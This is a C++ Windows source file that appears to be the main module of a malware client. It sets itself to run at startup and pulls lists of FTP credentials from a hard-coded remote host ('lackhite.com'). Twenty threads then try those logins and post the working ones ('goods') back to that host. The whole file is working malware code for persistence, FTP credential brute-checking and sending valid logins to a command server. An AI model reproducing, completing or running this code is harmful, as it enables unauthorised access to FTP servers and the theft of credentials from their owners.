#include <windows.h>

#include "httprequest.h"
#include "autorun.h"
#include "ftpconnect.h"
#include "ftpuserdata.h"

#include <iostream>
using namespace std;

#define THREADS_NUMBER 20
//10
#define PAUSE 5
//10 ms

FTPConnect *ftpConnect;

DWORD WINAPI ThreadProc(CONST LPVOID lpParam);
VOID Error(CONST HANDLE hStdOut, CONST LPCWSTR szMessage);

class HostData {
public:
	HostData(wstring host, wstring list, wstring goods) {
		this->host = host;
		this->list = list;
		this->goods = goods;
	}
	wstring getHost() {
		return host;
	}
	wstring getList() {
		return list;
	}
	wstring getGoods() {
		return goods;
	}
private:
	wstring host;
	wstring list;
	wstring goods;
};

vector < HostData > hosts;
int curHost;

int WINAPI initThreads() {
	TCHAR szMessage[256];
	DWORD dwTemp, i;
	HANDLE hThreads[THREADS_NUMBER];
	CONST HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	CONST HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);
	if(NULL == hMutex) {
		Error(hStdOut, TEXT("Failed to create mutex.\r\n"));
	}

	for(i = 0; i < THREADS_NUMBER; i++) {
		hThreads[i] = CreateThread(NULL, 0, &ThreadProc, hMutex, 0, NULL);
		if(NULL == hThreads[i]) {
			Error(hStdOut, TEXT("Failed to create thread.\r\n"));
		}
	}

	WaitForMultipleObjects(THREADS_NUMBER, hThreads, TRUE, INFINITE);
	WriteConsole(hStdOut, szMessage, lstrlen(szMessage), &dwTemp, NULL);

	for(i = 0; i < THREADS_NUMBER; i++) {
		CloseHandle(hThreads[i]);
	}
	CloseHandle(hMutex);
}

DWORD WINAPI ThreadProc(CONST LPVOID lpParam) {
	CONST HANDLE hMutex = (CONST HANDLE)lpParam;
	while (true) {
		WaitForSingleObject(hMutex, INFINITE);
		if (!ftpConnect->isEmpty()) {
			if (ftpConnect->connect()) {
				cout << "sending good" << endl;
				HttpRequest Request(L"Example UserAgent/1.0", L"", L"");
				Request.SendPostRequest(ftpConnect->getGood(), hosts[curHost].getHost(), hosts[curHost].getGoods());
			}
		} else {
			break;
		}
		ReleaseMutex(hMutex);
		Sleep(PAUSE);
	}
	ExitThread(0);
}

VOID Error(CONST HANDLE hStdOut, CONST LPCWSTR szMessage) {
	DWORD dwTemp;
	TCHAR szError[256];
	WriteConsole(hStdOut, szMessage, lstrlen(szMessage), &dwTemp, NULL);
	wsprintf(szError, TEXT("LastError = %d\r\n"), GetLastError());
	WriteConsole(hStdOut, szError, lstrlen(szError), &dwTemp, NULL);
	ExitProcess(0);
}

bool initHttpRequest(vector<FTPUserData> *vData) {
	HttpRequest Request(L"Example UserAgent/1.0", L"", L"");
	if (Request.SendRequest(vData, hosts[curHost].getHost(), hosts[curHost].getList())) {
		return true;
    }
	return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (Autorun::selfAutorun()) {
		cout << "autorun: TRUE" << endl;
	} else {
		cout << "autorun: FALSE" << endl;
	}
	vector<FTPUserData> *vData = new vector<FTPUserData>();

	hosts.push_back(HostData(L"lackhite.com", L"/work/ftp3.php", L"/work/post.php"));
	curHost = 0;

	while (true) {
		if (initHttpRequest(vData)) {
			ftpConnect = new FTPConnect(vData);
			initThreads();			
			vData->clear();
		}
	}

	ExitProcess(0);
}